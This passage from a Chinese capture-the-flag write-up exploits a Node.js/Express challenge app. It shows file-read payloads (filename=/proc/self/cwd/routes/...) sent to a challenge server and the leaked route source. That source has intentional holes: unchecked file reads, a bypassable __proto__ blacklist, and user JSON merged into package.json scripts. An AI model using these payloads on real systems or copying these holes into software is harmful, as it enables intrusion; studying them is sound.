class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后根据这个代码</p><p><img src="../images/image-20230504193939368.png" alt="image-20230504193939368"></p><p><img src="../images/image-20230504194038107.png" alt="image-20230504194038107"></p><p>这就是引入的一个文件，于是我们尝试进行这个文件的读取，看里面有啥功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一开始还报错是因为没有加后缀.js，就好像访问php页面不加php一样</span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=/proc/self/cwd/routes/dashbo</span><br><span class="line">ardIndex.js</span><br><span class="line"></span><br><span class="line">这个路径可能也是这个框架默认的路径吧，应该和thinkphp差不多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=./routes/dashboardIndex.js</span><br><span class="line">上面的二种方法都可以实现</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230504194423815.png" alt="image-20230504194423815"></p><p>读取到的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/tmp&quot;</span>)&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileData</span>(<span class="params">fileDatas</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileDatas.<span class="title function_">includes</span>(blacklist[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get example file</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/ShowExampleFile&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;app&quot;</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">filename</span> || <span class="string">&quot;./example/example.json&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Home&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>:<span class="string">&quot;Welcome back&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/getHint2&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> hintName = <span class="string">&quot;hint2.png&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../hints&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(hintName,options,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Get hint2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// show uploaded files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/UploadList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No uploaded files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: lists,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// show packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PacksList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No packed files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lists.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        result += <span class="string">&quot;&lt;a href=&#x27;/dashboardIndex/DownloadPackage?name=&quot;</span> + lists[i] + <span class="string">&quot;&#x27;&gt;&quot;</span> + lists[i] + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: result,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Download packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/DownloadPackage&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">query</span>.<span class="property">name</span> === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        req.<span class="property">query</span>.<span class="property">name</span> = <span class="string">&quot;example.tgz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> packageName = req.<span class="property">query</span>.<span class="property">name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>) !== -<span class="number">1</span> || packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;..&quot;</span>) !== -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;.tgz&quot;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a package file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packagePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs/&quot;</span>,packageName);</span><br><span class="line">    <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(packagePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> contentType = <span class="string">&quot;application/x-gtar&quot;</span>;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + packageName);</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-type&quot;</span>, contentType);</span><br><span class="line">    res.<span class="title function_">download</span>(packagePath,packageName,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Download failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload files</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/Upload&quot;</span>,upload.<span class="title function_">any</span>(),<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;upload&quot;</span>,&#123;<span class="attr">upload_result</span>:<span class="string">&quot;plz upload file&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;No files were uploaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> file = req.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> fileData = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(fileData))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File data invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload/&quot;</span>,file.<span class="property">originalname</span>);</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>) === <span class="string">&quot;.json&quot;</span>) &#123;</span><br><span class="line">            fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload error&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload success&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Not a JSON file&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set dependencies</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    